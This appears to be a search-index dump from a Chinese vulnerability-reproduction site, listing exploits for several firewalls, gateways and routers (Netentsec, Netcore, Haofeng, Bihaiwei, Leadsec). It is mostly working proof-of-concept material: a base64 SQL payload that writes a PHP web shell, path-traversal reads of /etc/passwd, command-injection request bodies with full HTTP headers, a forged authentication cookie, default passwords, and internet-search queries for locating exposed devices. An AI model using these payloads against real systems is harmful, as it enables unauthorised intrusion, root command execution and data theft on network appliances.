if($ifother!=\"\"){ $post_filename = $ifother; } $str = \"/usr/bin/cap2con $post_filename pop\"; system($str,$returnvalue); $post_filename=str_replace(\".cap\",\".eml\",$post_filename); $post_content = file_get_contents($post_filename); $rec=new mime_decode; $post_content=$rec-\u003edecode_mime_string($post_content); //... } } } 这里可以发现通过base64解码后执行的Sql语句结果传入函数exportHtmlMail中调用system执行, 而 $post_filename 可控 $str = \"/usr/bin/cap2con $post_filename pop\"; 验证POC https://xxx.xxx.xxx.xxx/importhtml.php?type=exporthtmlmail\u0026tab=tb_RCtrlLog\u0026sql=c2VsZWN0IDB4M2MzZjcwNjg3MDIwNjU2MzY4NmYyMDczNzk3Mzc0NjU2ZDI4MjQ1ZjUwNGY1MzU0NWIyMjYzNmQ2NDIyNWQyOTNiM2YzZSBpbnRvIG91dGZpbGUgJy91c3IvaGRkb2NzL25zZy9hcHAvc3lzMS5waHAn 访问成功后会触发下载日志文件，再访问 sys1.php ","date":"0001-01-01","objectID":"/%E7%99%BE%E5%8D%93-smart-importhtml.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E7%99%BE%E5%8D%93-smart-importhtml.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"皓峰防火墙 setdomain.php 越权访问漏洞 ","date":"0001-01-01","objectID":"/%E7%9A%93%E5%B3%B0%E9%98%B2%E7%81%AB%E5%A2%99-setdomain.php-%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E7%9A%93%E5%B3%B0%E9%98%B2%E7%81%AB%E5%A2%99-setdomain.php-%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 皓峰防火墙 setdomain.php 页面存在越权访问漏洞，攻击者通过漏洞可修改管理员等配置信息 ","date":"0001-01-01","objectID":"/%E7%9A%93%E5%B3%B0%E9%98%B2%E7%81%AB%E5%A2%99-setdomain.php-%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E7%9A%93%E5%B3%B0%E9%98%B2%E7%81%AB%E5%A2%99-setdomain.php-%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 皓峰防火墙 ","date":"0001-01-01","objectID":"/%E7%9A%93%E5%B3%B0%E9%98%B2%E7%81%AB%E5%A2%99-setdomain.php-%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E7%9A%93%E5%B3%B0%E9%98%B2%E7%81%AB%E5%A2%99-setdomain.php-%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"皓峰防火墙系统登录\" ","date":"0001-01-01","objectID":"/%E7%9A%93%E5%B3%B0%E9%98%B2%E7%81%AB%E5%A2%99-setdomain.php-%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E7%9A%93%E5%B3%B0%E9%98%B2%E7%81%AB%E5%A2%99-setdomain.php-%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 验证POC /setdomain.php?action=list ","date":"0001-01-01","objectID":"/%E7%9A%93%E5%B3%B0%E9%98%B2%E7%81%AB%E5%A2%99-setdomain.php-%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E7%9A%93%E5%B3%B0%E9%98%B2%E7%81%AB%E5%A2%99-setdomain.php-%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"碧海威 L7多款产品 后台命令执行漏洞 ","date":"0001-01-01","objectID":"/%E7%A2%A7%E6%B5%B7%E5%A8%81-l7%E5%A4%9A%E6%AC%BE%E4%BA%A7%E5%93%81-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E7%A2%A7%E6%B5%B7%E5%A8%81-l7%E5%A4%9A%E6%AC%BE%E4%BA%A7%E5%93%81-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 碧海威 L7多款产品存在 后台命令执行漏洞，攻击者通过账号密码登录后台后，通过命令拼接造成命令注入。 ","date":"0001-01-01","objectID":"/%E7%A2%A7%E6%B5%B7%E5%A8%81-l7%E5%A4%9A%E6%AC%BE%E4%BA%A7%E5%93%81-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E7%A2%A7%E6%B5%B7%E5%A8%81-l7%E5%A4%9A%E6%AC%BE%E4%BA%A7%E5%93%81-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 碧海威 L7多款产品 ","date":"0001-01-01","objectID":"/%E7%A2%A7%E6%B5%B7%E5%A8%81-l7%E5%A4%9A%E6%AC%BE%E4%BA%A7%E5%93%81-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E7%A2%A7%E6%B5%B7%E5%A8%81-l7%E5%A4%9A%E6%AC%BE%E4%BA%A7%E5%93%81-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登陆页面如下： 默认密码为 adimn/admin or admin123 漏洞存在于 命令控制台中，其中存在命令注入 可以使用 help \u0026 sh 得到交互式命令写入恶意文件 help\u0026cat /etc/passwd ","date":"0001-01-01","objectID":"/%E7%A2%A7%E6%B5%B7%E5%A8%81-l7%E5%A4%9A%E6%AC%BE%E4%BA%A7%E5%93%81-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E7%A2%A7%E6%B5%B7%E5%A8%81-l7%E5%A4%9A%E6%AC%BE%E4%BA%A7%E5%93%81-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"磊科 NI360路由器 认证绕过漏洞 ","date":"0001-01-01","objectID":"/%E7%A3%8A%E7%A7%91-ni360%E8%B7%AF%E7%94%B1%E5%99%A8-%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E7%A3%8A%E7%A7%91-ni360%E8%B7%AF%E7%94%B1%E5%99%A8-%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 磊科 NI360路由器 存在认证绕过漏洞，通过添加特定的Cookie字段获取后台权限 ","date":"0001-01-01","objectID":"/%E7%A3%8A%E7%A7%91-ni360%E8%B7%AF%E7%94%B1%E5%99%A8-%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E7%A3%8A%E7%A7%91-ni360%E8%B7%AF%E7%94%B1%E5%99%A8-%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 磊科 NI360路由器 ","date":"0001-01-01","objectID":"/%E7%A3%8A%E7%A7%91-ni360%E8%B7%AF%E7%94%B1%E5%99%A8-%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E7%A3%8A%E7%A7%91-ni360%E8%B7%AF%E7%94%B1%E5%99%A8-%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 title=\"Netcore\" ","date":"0001-01-01","objectID":"/%E7%A3%8A%E7%A7%91-ni360%E8%B7%AF%E7%94%B1%E5%99%A8-%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E7%A3%8A%E7%A7%91-ni360%E8%B7%AF%E7%94%B1%E5%99%A8-%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 登录页面如下 添加 Cookie字段 : netcore_login=guest:1 刷新后登录后台 ","date":"0001-01-01","objectID":"/%E7%A3%8A%E7%A7%91-ni360%E8%B7%AF%E7%94%B1%E5%99%A8-%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E7%A3%8A%E7%A7%91-ni360%E8%B7%AF%E7%94%B1%E5%99%A8-%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网康 NS-ASG安全网关 cert_download.php 任意文件读取漏洞 ","date":"0001-01-01","objectID":"/%E7%BD%91%E5%BA%B7-ns-asg%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3-cert_download.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E7%BD%91%E5%BA%B7-ns-asg%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3-cert_download.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 网康 NS-ASG安全网关 cert_download.php 文件存在任意文件读取漏洞 ","date":"0001-01-01","objectID":"/%E7%BD%91%E5%BA%B7-ns-asg%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3-cert_download.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E7%BD%91%E5%BA%B7-ns-asg%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3-cert_download.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 网康 NS-ASG安全网关 ","date":"0001-01-01","objectID":"/%E7%BD%91%E5%BA%B7-ns-asg%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3-cert_download.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E7%BD%91%E5%BA%B7-ns-asg%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3-cert_download.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 网康 NS-ASG安全网关 ","date":"0001-01-01","objectID":"/%E7%BD%91%E5%BA%B7-ns-asg%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3-cert_download.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E7%BD%91%E5%BA%B7-ns-asg%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3-cert_download.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 出现漏洞的文件为 /admin/cert_download.php ![2](C:\\Users\\47236\\Desktop\\2.png)\u003c?php $filename = substr($file,strpos('certs/',$certfile)+6); //文件的类型 header('Content-type: application/pdf'); //下载显示的名字 header('Content-Disposition: attachment; filename=\"'.$filename.'\"'); readfile(\"$certfile\"); exit(); ?\u003e 此文件没有对身份进行校验即可下载任意文件 /admin/cert_download.php?file=test.txt\u0026certfile=../../../../../../../../etc/passwd /admin/cert_download.php?file=test.txt\u0026certfile=cert_download.php ","date":"0001-01-01","objectID":"/%E7%BD%91%E5%BA%B7-ns-asg%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3-cert_download.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E7%BD%91%E5%BA%B7-ns-asg%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3-cert_download.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网康 NS-ASG安全网关 index.php 远程命令执行漏洞 ","date":"0001-01-01","objectID":"/%E7%BD%91%E5%BA%B7-ns-asg%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3-index.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E7%BD%91%E5%BA%B7-ns-asg%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3-index.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 网康 NS-ASG安全网关 index.php文件存在远程命令执行漏洞，攻击者通过构造特殊的请求包可以获取服务器权限 ","date":"0001-01-01","objectID":"/%E7%BD%91%E5%BA%B7-ns-asg%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3-index.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E7%BD%91%E5%BA%B7-ns-asg%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3-index.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 网康 NS-ASG安全网关 ","date":"0001-01-01","objectID":"/%E7%BD%91%E5%BA%B7-ns-asg%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3-index.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E7%BD%91%E5%BA%B7-ns-asg%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3-index.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 title==\"网康 NS-ASG 应用安全网关\" ","date":"0001-01-01","objectID":"/%E7%BD%91%E5%BA%B7-ns-asg%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3-index.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E7%BD%91%E5%BA%B7-ns-asg%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3-index.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 存在漏洞的文件为 /protocol/index.php ，通过文件读取可以获取到源码 通过构造请求包进行命令拼接漏洞执行命令 POST /protocol/index.php jsoncontent={\"protocolType\":\"getsysdatetime\",\"messagecontent\":\"1;id\u003e1.txt;\"} ","date":"0001-01-01","objectID":"/%E7%BD%91%E5%BA%B7-ns-asg%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3-index.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E7%BD%91%E5%BA%B7-ns-asg%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3-index.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网康 下一代防火墙 HeartBeat.php 远程命令执行漏洞 ","date":"0001-01-01","objectID":"/%E7%BD%91%E5%BA%B7-%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99-heartbeat.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E7%BD%91%E5%BA%B7-%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99-heartbeat.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 网康 下一代防火墙 HeartBeat.php文件存在远程命令执行漏洞，攻击者通过构造请求包即可获取服务器Root权限 ","date":"0001-01-01","objectID":"/%E7%BD%91%E5%BA%B7-%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99-heartbeat.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E7%BD%91%E5%BA%B7-%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99-heartbeat.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 奇安信 网康下一代防火墙 ","date":"0001-01-01","objectID":"/%E7%BD%91%E5%BA%B7-%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99-heartbeat.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E7%BD%91%E5%BA%B7-%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99-heartbeat.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"网康科技-下一代防火墙\" ","date":"0001-01-01","objectID":"/%E7%BD%91%E5%BA%B7-%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99-heartbeat.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E7%BD%91%E5%BA%B7-%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99-heartbeat.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面如下 出现漏洞的文件 applications/Models/NS/Rpc/HeartBeat.php public function delTestFile($fileName){ if(dirname($fileName) == '/var/www/tmp'){ $cmd = \"/bin/rm -f {$fileName}\"; putenv(\"CMD=$cmd\"); $msg = shell_exec('/var/www/html/scripts/exec_cmd'); } return time(); } 调用方法 delTestFile，fileName参数可控，调用的 exec_cmd 文件为Root权限文件，构造请求包进行命令执行 POST /directdata/direct/router HTTP/1.1 Host: Connection: close Content-Length: 179 Cache-Control: max-age=0 sec-ch-ua: \"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\" sec-ch-ua-mobile: ?0 Content-Type: application/json Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 {\"action\":\"NS_Rpc_HeartBeat\",\"method\":\"delTestFile\",\"data\": [\"/var/www/tmp/1.txt;id\u003e2.txt\"],\"type\":\"rpc\",\"tid\":11,\"f8839p7rqtj\":\"=\"} 访问写入的文件 ","date":"0001-01-01","objectID":"/%E7%BD%91%E5%BA%B7-%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99-heartbeat.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E7%BD%91%E5%BA%B7-%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99-heartbeat.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网康 下一代防火墙 router 远程命令执行漏洞 ","date":"0001-01-01","objectID":"/%E7%BD%91%E5%BA%B7-%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99-router-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E7%BD%91%E5%BA%B7-%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99-router-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 奇安信 网康下一代防火墙存在远程命令执行，通过漏洞攻击者可以获取服务器权限 ","date":"0001-01-01","objectID":"/%E7%BD%91%E5%BA%B7-%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99-router-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E7%BD%91%E5%BA%B7-%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99-router-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 奇安信 网康下一代防火墙 ","date":"0001-01-01","objectID":"/%E7%BD%91%E5%BA%B7-%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99-router-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E7%BD%91%E5%BA%B7-%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99-router-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"网康科技-下一代防火墙\" ","date":"0001-01-01","objectID":"/%E7%BD%91%E5%BA%B7-%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99-router-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E7%BD%91%E5%BA%B7-%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99-router-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面如下 发送如下请求包 ![2](C:\\Users\\47236\\Desktop\\2.png)POST /directdata/direct/router HTTP/1.1 Host: XXX.XXX.XXX.XXX Connection: close Content-Length: 179 Cache-Control: max-age=0 sec-ch-ua: \"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\" sec-ch-ua-mobile: ?0 Content-Type: application/json Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 {\"action\":\"SSLVPN_Resource\",\"method\":\"deleteImage\",\"data\":[{\"data\":[\"/var/www/html/d.txt;cat /etc/passwd \u003e/var/www/html/test_cmd.txt\"]}],\"type\":\"rpc\",\"tid\":17,\"f8839p7rqtj\":\"=\"} 再请求获取命令执行结果 http://xxx.xxx.xxx.xxxx/test_cmd.txt ","date":"0001-01-01","objectID":"/%E7%BD%91%E5%BA%B7-%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99-router-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E7%BD%91%E5%BA%B7-%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99-router-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网御 ACM上网行为管理系统 bottomframe.cgi SQL注入漏洞 ","date":"0001-01-01","objectID":"/%E7%BD%91%E5%BE%A1-acm%E4%B8%8A%E7%BD%91%E8%A1%8C%E4%B8%BA%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-bottomframe.cgi-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E7%BD%91%E5%BE%A1-acm%E4%B8%8A%E7%BD%91%E8%A1%8C%E4%B8%BA%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-bottomframe.cgi-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 网御 ACM上网行为管理系统 bottomframe.cgi 存在SQL注入漏洞，攻击者通过漏洞可以获取服务器数据库敏感信 ","date":"0001-01-01","objectID":"/%E7%BD%91%E5%BE%A1-acm%E4%B8%8A%E7%BD%91%E8%A1%8C%E4%B8%BA%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-bottomframe.cgi-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E7%BD%91%E5%BE%A1-acm%E4%B8%8A%E7%BD%91%E8%A1%8C%E4%B8%BA%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-bottomframe.cgi-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 网御 ACM上网行为管理系统 ","date":"0001-01-01","objectID":"/%E7%BD%91%E5%BE%A1-acm%E4%B8%8A%E7%BD%91%E8%A1%8C%E4%B8%BA%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-bottomframe.cgi-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E7%BD%91%E5%BE%A1-acm%E4%B8%8A%E7%BD%91%E8%A1%8C%E4%B8%BA%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-bottomframe.cgi-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 \"scripts/webcommon.js\" 